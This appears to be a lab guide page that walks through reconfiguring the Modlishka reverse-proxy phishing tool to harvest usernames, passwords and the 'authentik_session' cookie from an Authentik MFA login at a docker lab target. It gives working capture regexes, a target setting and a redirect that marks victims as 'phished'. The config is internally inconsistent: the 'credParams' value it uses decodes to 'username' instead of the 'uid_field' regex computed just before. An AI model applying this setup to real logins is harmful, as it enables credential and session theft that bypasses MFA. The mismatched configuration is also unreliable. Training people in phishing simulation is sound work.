+++
title = "Reconfigure Modlishka With MFA Authentication Provider"
weight = 75
+++

Let's go through the auth flow to determine what the username and password fields when conducting a normal login.

TODO: Screenshots

We can see that the fields are `uid_field` and `password`.

Now we need to find a URL path that is only hit when the target successfully logs in.

TODO: Screenshots

Lets use `/if/user`.

Now we need to determine the session cookie.

TODO: Screenshots

Looks like `authentik_session` maybe the one we are after. We are lucky they used descriptive names and very few cookies.

We have all the required information to reconfigure Modlishka.

We'll start by updating the `"target"` in Modlishka's config.

```json
  "target": "auth.target.docker:9000",
```

Now we need to create some regular expressions to match the username and password fields.

```bash
echo -n '"uid_field":\s*"(.+?)"' | base64
echo -n '"password":\s*"(.+?)"' | base64

```
We'll join these two values together with a comma, then update the `"credParams"` configuration value.

```
InVpZF9maWVsZCI6XHMqIiguKz8pIg==,InBhc3N3b3JkIjpccyoiKC4rPyki
```

```json
  "credParams": "InVzZXJuYW1lIjpccyoiKC4rPyki,InBhc3N3b3JkIjpccyoiKC4rPyki"
```

Finally, we need to update the `"terminateTriggers"` and `"terminateRedirectUrl"`.

```json
  "terminateRedirectUrl": "https://uvcyber.com/?phished",
  "terminateTriggers": "/if/user",
```
